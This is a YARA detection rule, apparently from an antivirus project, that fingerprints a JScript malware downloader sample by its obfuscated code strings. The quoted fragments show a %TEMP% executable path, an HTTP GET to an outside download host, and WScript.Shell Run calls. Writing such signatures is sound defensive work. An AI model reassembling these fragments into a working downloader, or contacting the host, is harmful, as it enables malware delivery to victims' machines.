rule sig_20160328_c212ae81f986f7e63126cc8dec2d38fe {
  meta:
    description = "datamaliciousorder - file 20160328_c212ae81f986f7e63126cc8dec2d38fe.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "73df15c5ae36c3272474f829e43c07b17a0136d45029b93f74f52eeffbf5675e"

  strings:
    $s1  = "function Pebvglmctn() {return Jvjks[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"q0Uxcahj0AYWN.exe\";};" fullword ascii
    $s2  = "Snoxy[Qhqrk](\"GET\", \"http://purelaces.com/ny6sja\", false);" fullword ascii
    $s3  = "do {WScript[Kmhtwctns](Rnusq() * 11)} while (Snoxy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Jvjks = function Llwjgirwi() {return WScript[Lnwcbjtaa](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Hafnrp(Wsrdxq, Zziswhvos){return Wsrdxq - Zziswhvos;};" fullword ascii
    $s6  = "function Qqcmp(Rpwavbh){Jvjks[\"Run\"](Rpwavbh, Xzxnc, Xzxnc);};" fullword ascii
    $s7  = "function Gnzzbikm() {return ((Sshaoqnyws == true) && (Sshaoqnyws == Vmdhzezrbd)) ? 1 : Xzxnc;};" fullword ascii
    $s8  = "function Piwlhhpy(Llbjqez) {var Qosopxb = (1, 2, 3, 4, 5, Llbjqez); return Qosopxb;};" fullword ascii
    $s9  = "return Hafnrp(Uotkyksjbq, Dneefvcnq);" fullword ascii
    $s10 = "var Ssoedhdz = false;" fullword ascii
    $s11 = "function Aiotrbe(){return Pcugvo;};" fullword ascii
    $s12 = "var Ayeplnqa = new this[\"Date\"]();" fullword ascii
    $s13 = "function Rnusq(){return 22;};" fullword ascii
    $s14 = "var Sshaoqnyws = false;" fullword ascii
    $s15 = "var Vmdhzezrbd = false;" fullword ascii
    $s16 = "function Abbyk()" fullword ascii
    $s17 = "Vmdhzezrbd = true; " fullword ascii
    $s18 = "function Cbekvoycl(){return Lnwcbjtaa;};" fullword ascii
    $s19 = " while (Eoizgrpfe){" fullword ascii
    $s20 = "Sshaoqnyws = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}